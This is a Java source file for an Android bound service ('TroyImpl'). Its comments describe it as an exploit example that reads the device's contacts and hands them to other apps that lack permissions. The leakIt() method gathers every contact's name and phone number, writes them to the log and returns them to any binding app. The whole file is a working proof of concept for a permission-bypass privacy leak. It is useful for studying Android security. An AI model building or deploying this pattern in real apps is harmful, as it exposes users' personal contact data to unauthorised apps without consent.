package de.macmark.server;

import de.macmark.server.ITroyService;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.util.Log;

//Reading contacts and giving them away to other apps (that have no permissions) via inter app service.
//For more informations take a look at http://www.macmark.de/android.php#example_exploit3

public class TroyImpl extends Service {


	@Override
	public IBinder onBind(Intent intent) {
		
		Log.e("REMOTE SERVICE ", "INVOKED");

		return new ITroyService.Stub() {
			/**
			 * Implementation of the getContacts() method
			 */
			public String leakIt() throws RemoteException {
				Log.e("service", "bin schon drin");
				
				
				StringBuffer buf = new StringBuffer("Kontakte");

				Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null); 
				while (cursor.moveToNext()) { 
					String contactId = cursor.getString(cursor.getColumnIndex( 
							ContactsContract.Contacts._ID)); 
					String contactName = cursor.getString(cursor.getColumnIndex( 
							ContactsContract.Contacts.DISPLAY_NAME)); 
					String hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
					Log.e("contact id/name/hasPhone", contactId +"/"+contactName+"/"+hasPhone);
					if (hasPhone.equals("1")) { 
						Log.e("contact has phone", "yes");
						// You know it has a number so now query it like this
						Cursor phones = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null); 
						while (phones.moveToNext()) { 
							String phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER)); 
//							Log.e("contact id/name/phone", contactId +"/"+contactName+"/"+phoneNumber);
							buf.append("\ncontact id/name/phone = " + contactId + " " + contactName + " " + phoneNumber); 
						} 
						phones.close();  
						Log.e("contacts", buf.toString());
					}
					else {
						Log.e("contact has no phone", "no");
					}



				}

				
				
				
				return "du ahnst es nicht! " + buf.toString();
			}

		};
	}

}